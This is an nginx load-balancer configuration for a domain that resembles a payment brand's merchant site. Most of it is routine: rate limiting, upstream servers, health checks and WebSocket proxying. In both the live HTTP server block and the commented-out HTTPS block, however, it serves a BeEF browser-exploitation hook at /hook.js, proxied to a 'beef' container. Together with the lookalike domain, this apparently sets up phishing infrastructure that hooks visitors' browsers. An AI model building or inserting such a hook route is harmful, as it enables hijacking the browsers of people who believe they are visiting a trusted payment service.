# Load balancer configuration for backend API cluster
events {
    worker_connections 1024;
}

http {
    # Rate limiting zones
    limit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;
    limit_req_zone $binary_remote_addr zone=login:10m rate=5r/m;

    upstream backend_cluster {
        least_conn;
        server backend-1:8000 max_fails=3 fail_timeout=30s;
        server backend-2:8000 max_fails=3 fail_timeout=30s;
        server backend-3:8000 max_fails=3 fail_timeout=30s;
    }

    # HTTP server - serve content directly (no HTTPS redirect for now)
    server {
        listen 80;
        server_name zalopaymerchan.com www.zalopaymerchan.com;

        # Health check endpoint
        location /health/lb {
            access_log off;
            return 200 "load balancer healthy\n";
            add_header Content-Type text/plain;
        }

        # ACME challenge for Let's Encrypt
        location /.well-known/acme-challenge/ {
            root /var/www/certbot;
            try_files $uri =404;
        }

        # Static files caching
        location /static/ {
            proxy_pass http://backend_cluster;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;
            
            # Cache static files
            expires 1y;
            add_header Cache-Control "public, immutable";
            add_header Vary "Accept-Encoding";
        }

        # BeEF hook endpoint
        location /hook.js {
            proxy_pass http://beef:3000/hook.js;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;
            
            # Cache hook script
            expires 1h;
            add_header Cache-Control "public";
        }

        # WebSocket support for admin dashboard
        location /ws/ {
            proxy_pass http://backend_cluster;
            proxy_http_version 1.1;
            proxy_set_header Upgrade $http_upgrade;
            proxy_set_header Connection "upgrade";
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;
            
            # WebSocket timeouts
            proxy_read_timeout 86400;
            proxy_send_timeout 86400;
        }

        # Proxy all other requests to backend cluster
        location / {
            proxy_pass http://backend_cluster;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;
            proxy_set_header X-Forwarded-Host $host;
            proxy_set_header X-Forwarded-Port $server_port;
            
            # Connection settings
            proxy_http_version 1.1;
            proxy_set_header Connection "";
            
            # Timeouts
            proxy_connect_timeout 5s;
            proxy_send_timeout 60s;
            proxy_read_timeout 60s;
            
            # Buffer settings
            proxy_buffering on;
            proxy_buffer_size 4k;
            proxy_buffers 8 4k;
            proxy_busy_buffers_size 8k;
            
            # Error handling
            proxy_next_upstream error timeout invalid_header http_500 http_502 http_503 http_504;
            proxy_next_upstream_tries 3;
            proxy_next_upstream_timeout 10s;
            
            # Rate limiting
            limit_req zone=api burst=20 nodelay;
        }
    }

    # HTTPS server (commented out until certificates are available)
    # server {
    #     listen 443 ssl http2;
    #     server_name zalopaymerchan.com www.zalopaymerchan.com;
    #
    #     # SSL Configuration
    #     ssl_certificate /etc/letsencrypt/live/zalopaymerchan.com/fullchain.pem;
    #     ssl_certificate_key /etc/letsencrypt/live/zalopaymerchan.com/privkey.pem;
    #     
    #     # SSL Security Settings
    #     ssl_protocols TLSv1.2 TLSv1.3;
    #     ssl_ciphers ECDHE-RSA-AES256-GCM-SHA512:DHE-RSA-AES256-GCM-SHA512:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-SHA384;
    #     ssl_prefer_server_ciphers off;
    #     ssl_session_cache shared:SSL:10m;
    #     ssl_session_timeout 10m;
    #     
    #     # Security Headers
    #     add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
    #     add_header X-Frame-Options DENY;
    #     add_header X-Content-Type-Options nosniff;
    #     add_header X-XSS-Protection "1; mode=block";
    #     add_header Referrer-Policy "strict-origin-when-cross-origin";
    #
    #     # Health check endpoint
    #     location /health/lb {
    #         access_log off;
    #         return 200 "load balancer healthy\n";
    #         add_header Content-Type text/plain;
    #     }
    #
    #     # Static files caching
    #     location /static/ {
    #         proxy_pass http://backend_cluster;
    #         proxy_set_header Host $host;
    #         proxy_set_header X-Real-IP $remote_addr;
    #         proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    #         proxy_set_header X-Forwarded-Proto $scheme;
    #         
    #         # Cache static files
    #         expires 1y;
    #         add_header Cache-Control "public, immutable";
    #         add_header Vary "Accept-Encoding";
    #     }
    #
    #     # BeEF hook endpoint
    #     location /hook.js {
    #         proxy_pass http://beef:3000/hook.js;
    #         proxy_set_header Host $host;
    #         proxy_set_header X-Real-IP $remote_addr;
    #         proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    #         proxy_set_header X-Forwarded-Proto $scheme;
    #         
    #         # Cache hook script
    #         expires 1h;
    #         add_header Cache-Control "public";
    #     }
    #
    #     # WebSocket support for admin dashboard
    #     location /ws/ {
    #         proxy_pass http://backend_cluster;
    #         proxy_http_version 1.1;
    #         proxy_set_header Upgrade $http_upgrade;
    #         proxy_set_header Connection "upgrade";
    #         proxy_set_header Host $host;
    #         proxy_set_header X-Real-IP $remote_addr;
    #         proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    #         proxy_set_header X-Forwarded-Proto $scheme;
    #         
    #         # WebSocket timeouts
    #         proxy_read_timeout 86400;
    #         proxy_send_timeout 86400;
    #     }
    #
    #     # Proxy all other requests to backend cluster
    #     location / {
    #         proxy_pass http://backend_cluster;
    #         proxy_set_header Host $host;
    #         proxy_set_header X-Real-IP $remote_addr;
    #         proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    #         proxy_set_header X-Forwarded-Proto $scheme;
    #         proxy_set_header X-Forwarded-Host $host;
    #         proxy_set_header X-Forwarded-Port $server_port;
    #         
    #         # Connection settings
    #         proxy_http_version 1.1;
    #         proxy_set_header Connection "";
    #         
    #         # Timeouts
    #         proxy_connect_timeout 5s;
    #         proxy_send_timeout 60s;
    #         proxy_read_timeout 60s;
    #         
    #         # Buffer settings
    #         proxy_buffering on;
    #         proxy_buffer_size 4k;
    #         proxy_buffers 8 4k;
    #         proxy_busy_buffers_size 8k;
    #         
    #         # Error handling
    #         proxy_next_upstream error timeout invalid_header http_500 http_502 http_503 http_504;
    #         proxy_next_upstream_tries 3;
    #         proxy_next_upstream_timeout 10s;
    #         
    #         # Rate limiting
    #         limit_req zone=api burst=20 nodelay;
    #     }
    # }

    # Fallback HTTP server for other domains
    server {
        listen 80 default_server;
        server_name _;

        # Health check endpoint
        location /health/lb {
            access_log off;
            return 200 "load balancer healthy\n";
            add_header Content-Type text/plain;
        }

        # Return 444 for other requests (close connection)
        location / {
            return 444;
        }
    }
}